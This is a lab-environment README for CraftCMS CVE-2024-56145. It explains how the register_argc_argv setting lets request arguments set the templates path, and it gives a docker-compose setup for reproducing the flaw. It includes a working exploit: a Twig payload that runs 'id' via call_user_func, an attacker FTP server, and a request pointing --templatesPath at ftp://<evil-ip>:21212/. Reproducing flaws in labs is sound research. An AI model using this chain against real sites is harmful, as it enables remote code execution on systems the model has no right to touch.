# CraftCMS `register_argc_argv` Leads to Remote Code Execution (CVE-2024-56145)

[中文版本(Chinese version)](README.zh-cn.md)

CraftCMS is a PHP-based content management system for building websites and applications.

CraftCMS version before 5.5.2 and 4.13.2 is vulnerable to remote code execution if the PHP setting `register_argc_argv` is enabled. When `register_argc_argv` is enabled, CraftCMS incorrectly reads configuration items from the HTTP request, allowing an attacker to control template files using the `--templatesPath`, which can lead to arbitrary code execution through template injection.

## Vulnerable Environment

Execute the following command to start a CraftCMS server 5.5.1.1:

```
docker-compose up -d
```

After the server is running, you can see the installation page at `http://<your-ip>:8088/admin/install`. Please follow the instructions to install CraftCMS, the default database address is `db` and the username and password are both `root`.

## Exploit

To reproduce the vulnerability, you need to prepare a craft `index.twig` file which contains the following content, then place it on any remote server:

```twig
{{ ['system', 'id'] | sort('call_user_func') | join('') }}
```

Then start a FTP server in the server where the `index.twig` file is located:

```bash
# install pyftpdlib
pip install pyftpdlib

# start a FTP server
python -m pyftpdlib -p 21212 -V
```

Then you can exploit the vulnerability by sending the following request:

```
http://<your-ip>:8088/?--templatesPath=ftp://<evil-ip>:21212/
```

As you can see, the `id` command is executed and the output is returned.
